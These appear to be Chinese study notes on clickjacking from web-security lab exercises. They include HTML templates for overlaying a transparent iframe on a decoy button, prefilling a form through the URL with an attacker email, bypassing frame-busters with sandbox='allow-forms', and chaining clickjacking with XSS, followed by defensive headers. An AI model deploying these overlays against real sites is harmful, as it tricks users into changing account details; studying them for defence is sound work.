# 一、知识点

本质：可以看成一个复杂版但是增强版的CSRF

### 1. 使用iframe加载目标页面、使用style隐藏iframe，并且显示虚伪页面

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 700px;
        opacity: 0.5 ;
        z-index: 2;
    }
    div {
        position:absolute;
        top:493px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0ac4003a0319475d80692be900fd004d.web-security-academy.net/my-account"></iframe>
```

步骤：

1. iframe加载目标页面
2. styple调整虚伪页面与目标页面的位置
3. 调整之后，设置opacity为非常小，隐藏真实页面

注意：

1. 真实页面的 z-index需要比虚伪页面的大
2. opacity是显示度

### 2. 利用url预填充表单，劫持填充的敏感操作

步骤：

1. 发现一个敏感操作表单
2. 在url中加上?表单字段=xxx，表单自动填充xxx
3. 那么只需要把iframe的src带上?表单字段就行

### 3. 绕过iframe buster保护

步骤：

1. 在iframe标签中添加sandbox="allow-forms"

```html
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

### 4. URL预填充表单+POST_XSS

只需要发现XSS是URL可填充表单的就可以用于ClickJ

目的：

1. 如果是post xss，那么相当于csrf，如果存在csrf token，就无效
2. 点击劫持可以用于绕过CSRF token的XSS，前提：URL可填充

### 5. 防护手段

##### 1. X-Frame-Options响应头：

| 值               | 含义                                        |
| ---------------- | ------------------------------------------- |
| `DENY`           | 完全禁止嵌套                                |
| `SAMEORIGIN`     | 只允许同源页面嵌套                          |
| `ALLOW-FROM uri` | 仅允许指定来源 uri 的页面嵌套（被广泛弃用） |

##### 2. `Content-Security-Policy` 的 `frame-ancestors` 指令

| 值                    | 含义             |
| --------------------- | ---------------- |
| `'none'`              | 禁止所有页面嵌套 |
| `'self'`              | 允许同源页面嵌套 |
| `https://example.com` | 允许指定域嵌套   |